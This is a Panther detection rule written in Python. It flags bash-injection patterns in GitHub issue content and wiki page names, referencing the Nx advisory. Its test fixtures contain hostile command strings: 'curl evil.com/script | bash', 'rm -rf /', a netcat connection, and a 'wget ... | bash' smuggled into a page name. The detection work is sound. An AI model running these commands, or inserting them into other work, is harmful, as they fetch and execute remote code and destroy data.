from pypanther import LogType, Rule, RuleTest, Severity, panther_managed
from pypanther.helpers.github import (
    contains_bash_injection_pattern,
    get_matched_bash_patterns,
    github_reference_url,
    github_webhook_alert_context,
)


@panther_managed
class GitHubWebhookMaliciousIssuePagesContent(Rule):
    id = "GitHub.Webhook.MaliciousIssuePagesContent-prototype"
    display_name = "GitHub Malicious Issue/Pages Content"
    log_types = [LogType.GITHUB_WEBHOOK]
    reports = {"MITRE ATT&CK": ["TA0001:T1195.002", "TA0002:T1072"]}
    tags = ["Code Injection", "Supply Chain", "Social Engineering"]
    default_severity = Severity.MEDIUM
    default_description = "Detects malicious patterns in GitHub issue content (title and body) and GitHub wiki pages (page names) that could indicate bash injection attempts. This rule detects command substitution patterns similar to those found in the Nx vulnerability (GHSA-cxm3-wv7p-598c). Covers both issue events and Gollum (wiki) events.\n"
    default_runbook = "1. Review the issue or wiki page content for malicious patterns\n2. For issues: Check the issue author's profile and activity history\n3. For wiki pages: Check the page author and page edit history\n4. Determine if the content is legitimate or malicious\n5. Close and lock the issue if it's malicious, or revert wiki page edits\n6. Report the user if they appear to be intentionally posting malicious content\n7. Review recent activity from the same user in other repositories\n8. Consider blocking the user from the repository/organization\n9. Review CI/CD workflows that may process issue or wiki content\n"
    default_reference = "https://github.com/nrwl/nx/security/advisories/GHSA-cxm3-wv7p-598c"

    def rule(self, event):
        # Check if this is an issue event (opened or edited) and that it's open
        is_issue_event = (
            event.get("issue")
            and event.get("action") in ["opened", "edited"]
            and (event.deep_get("issue", "state") == "open")
        )
        # Check if this is a pages/wiki event (Gollum event)
        has_pages = event.get("pages")
        if not is_issue_event and (not has_pages):
            return False
        # Check issue fields if this is an issue event
        if is_issue_event:
            fields_to_check = [event.deep_get("issue", "title"), event.deep_get("issue", "body")]
            for field in fields_to_check:
                if contains_bash_injection_pattern(field):
                    return True
        # Check pages (for GitHub wiki/Gollum events)
        for page in event.get("pages", []):
            if contains_bash_injection_pattern(page.get("page_name")):
                return True
        return False

    def title(self, event):
        repo_name = event.deep_get("repository", "full_name", default="<UNKNOWN_REPO>")
        # If this is an issue event
        if event.get("issue"):
            issue_number = event.deep_get("issue", "number", default="<UNKNOWN_ISSUE_NUMBER>")
            user = event.deep_get("issue", "user", "login", default="<UNKNOWN_USER>")
            return f"Malicious pattern detected in issue #{issue_number} in {repo_name} by user [{user}]"
        # If this is a pages/wiki event
        if event.get("pages"):
            return f"Malicious pattern detected in wiki page in {repo_name}"
        return f"Malicious pattern detected in {repo_name}"

    def alert_context(self, event):
        context = github_webhook_alert_context(event)
        # Analyze patterns found in issue fields if this is an issue event
        if event.get("issue"):
            issue_fields = {"title": event.deep_get("issue", "title"), "body": event.deep_get("issue", "body")}
            context["field_analysis"] = {}
            for field_name, field_value in issue_fields.items():
                patterns = get_matched_bash_patterns(field_value)
                if patterns:
                    context["field_analysis"][field_name] = {"value": field_value, "matched_patterns": patterns}
            # Add issue details
            issue = event.get("issue", {})
            context["issue"] = {
                "number": issue.get("number"),
                "title": issue.get("title"),
                "state": issue.get("state"),
                "user": issue.get("user", {}).get("login"),
                "html_url": issue.get("html_url"),
                "created_at": issue.get("created_at"),
                "updated_at": issue.get("updated_at"),
            }
        # Analyze pages (for wiki/Gollum events)
        context["malicious_pages"] = []
        for page in event.get("pages", []):
            if page_name := page.get("page_name"):
                patterns = get_matched_bash_patterns(page_name)
                if patterns:
                    context["malicious_pages"].append(
                        {
                            "page_name": page_name,
                            "action": page.get("action"),
                            "title": page.get("title"),
                            "html_url": page.get("html_url"),
                            "matched_patterns": patterns,
                        },
                    )
        return context

    def reference(self, event):
        # Try to get the issue URL
        issue_url = event.deep_get("issue", "html_url")
        if issue_url:
            return issue_url
        # Try to get a page URL if this is a pages/wiki event
        if pages := event.get("pages"):
            if pages and len(pages) > 0 and pages[0].get("html_url"):
                return pages[0].get("html_url")
        if reference_url := github_reference_url(event):
            return reference_url
        return "DEFAULT"

    tests = [
        RuleTest(
            name="Issue with Command Substitution in Title",
            expected_result=True,
            log={
                "action": "opened",
                "issue": {
                    "number": 123,
                    "title": "Bug report $(echo 'malicious command')",
                    "body": "I found a bug in the application",
                    "state": "open",
                    "user": {"login": "suspicious-user", "id": 12345, "type": "User"},
                    "html_url": "https://github.com/target-org/repo/issues/123",
                    "created_at": "2024-01-15T10:30:00Z",
                },
                "repository": {"name": "repo", "full_name": "target-org/repo", "private": False},
                "sender": {"login": "suspicious-user", "type": "User"},
                "p_log_type": "GitHub.Webhook",
            },
        ),
        RuleTest(
            name="Issue with Backtick Command in Body",
            expected_result=True,
            log={
                "action": "opened",
                "issue": {
                    "number": 456,
                    "title": "Feature request",
                    "body": "Please run this command: `curl evil.com/script | bash`",
                    "state": "open",
                    "user": {"login": "attacker"},
                    "html_url": "https://github.com/victim-org/repo/issues/456",
                },
                "repository": {"full_name": "victim-org/repo"},
                "p_log_type": "GitHub.Webhook",
            },
        ),
        RuleTest(
            name="Issue with Shell Invocation Pattern",
            expected_result=True,
            log={
                "action": "edited",
                "issue": {
                    "number": 789,
                    "title": "Installation help",
                    "body": "Try running: /bin/bash -c 'rm -rf /'",
                    "state": "open",
                    "user": {"login": "malicious-actor"},
                },
                "repository": {"full_name": "target/repo"},
                "p_log_type": "GitHub.Webhook",
            },
        ),
        RuleTest(
            name="Normal Issue",
            expected_result=False,
            log={
                "action": "opened",
                "issue": {
                    "number": 999,
                    "title": "Add support for new authentication method",
                    "body": "This feature would allow users to authenticate using OAuth 2.0",
                    "state": "open",
                    "user": {"login": "legitimate-contributor"},
                },
                "repository": {"full_name": "org/repo"},
                "p_log_type": "GitHub.Webhook",
            },
        ),
        RuleTest(
            name="Non-Issue Event",
            expected_result=False,
            log={
                "action": "push",
                "ref": "refs/heads/main",
                "repository": {"full_name": "org/repo"},
                "p_log_type": "GitHub.Webhook",
            },
        ),
        RuleTest(
            name="Issue Event with Netcat Pattern",
            expected_result=True,
            log={
                "action": "opened",
                "issue": {
                    "number": 1111,
                    "title": "Connection test",
                    "body": "Test connection with: nc 1.2.3.4 4444",
                    "state": "open",
                    "user": {"login": "attacker"},
                },
                "repository": {"full_name": "target/repo"},
                "p_log_type": "GitHub.Webhook",
            },
        ),
        RuleTest(
            name="Wiki Page with Malicious Page Name",
            expected_result=True,
            log={
                "pages": [
                    {
                        "page_name": "index`wget 1.1.1.1/malware | bash`.html",
                        "title": "Index Page",
                        "action": "created",
                        "html_url": "https://github.com/org/repo/wiki/index",
                    },
                ],
                "repository": {"name": "repo", "full_name": "org/repo"},
                "sender": {"login": "attacker"},
                "p_log_type": "GitHub.Webhook",
            },
        ),
        RuleTest(
            name="Wiki Page with Command Substitution",
            expected_result=True,
            log={
                "pages": [
                    {
                        "page_name": "$(whoami)-test",
                        "title": "Test Page",
                        "action": "edited",
                        "html_url": "https://github.com/victim/repo/wiki/test",
                    },
                ],
                "repository": {"full_name": "victim/repo"},
                "p_log_type": "GitHub.Webhook",
            },
        ),
        RuleTest(
            name="Normal Wiki Page",
            expected_result=False,
            log={
                "pages": [
                    {
                        "page_name": "Home",
                        "title": "Home Page",
                        "action": "created",
                        "html_url": "https://github.com/org/repo/wiki/Home",
                    },
                ],
                "repository": {"full_name": "org/repo"},
                "p_log_type": "GitHub.Webhook",
            },
        ),
    ]
